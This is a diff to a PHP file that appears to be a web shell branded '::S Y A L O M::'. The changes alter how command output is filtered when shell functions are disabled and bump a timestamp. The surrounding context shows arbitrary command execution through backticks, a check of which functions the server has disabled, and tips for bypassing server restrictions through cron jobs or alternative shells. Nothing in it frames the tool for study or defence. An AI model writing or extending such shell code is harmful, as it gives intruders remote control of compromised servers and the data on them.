@@ -601,9 +601,15 @@ print `' . $cmd . ' 2>&1`;
     return "Error: All shell execution methods failed or are disabled.\n\nMethods tried: " . implode(", ", $methods_tried) . "\nDisabled functions: " . ($disabled_funcs ? $disabled_funcs : "None listed in disable_functions") . "\n\nPossible solutions:\n1. Use PHP file functions for basic operations\n2. Try using SQL queries if database is available\n3. Look for other entry points (cron, scheduled tasks)\n4. Check for bypass techniques specific to this server\n5. Consider using alternative shells (Perl, Python, etc.)";
 }
 
-// Helper function to filter out permission denied and not found errors
+// Helper function to filter command output for server info
 function filter_command_output($output) {
-    if (empty($output)) return "(No output)";
+    if (empty($output)) return "-";
+    
+    // Check if output is error message about disabled functions
+    if (strpos($output, 'All shell execution methods failed') !== false ||
+        strpos($output, 'are disabled') !== false) {
+        return "-"; // Return simple dash for disabled functions
+    }
     
     $lines = explode("\n", $output);
     $filtered = [];
@@ -630,7 +636,8 @@ function filter_command_output($output) {
         }
     }
     
-    return implode("\n", $filtered) ?: "(No valid output)";
+    $result = implode("\n", $filtered);
+    return $result ?: "-";
 }
 
 function get_detailed_server_info() {
@@ -3218,7 +3225,7 @@ function list_dir($path) {
 <body>
 <div class="container">
     <div class="menu-panel">
-        <h1>::S Y A L O M:: ~ 280326 1715</h1>
+        <h1>::S Y A L O M:: ~ 280326 2021</h1>
         <!-- Quick Actions Row -->
         <div class="section">
             <h3>⚡ Quick Actions</h3>
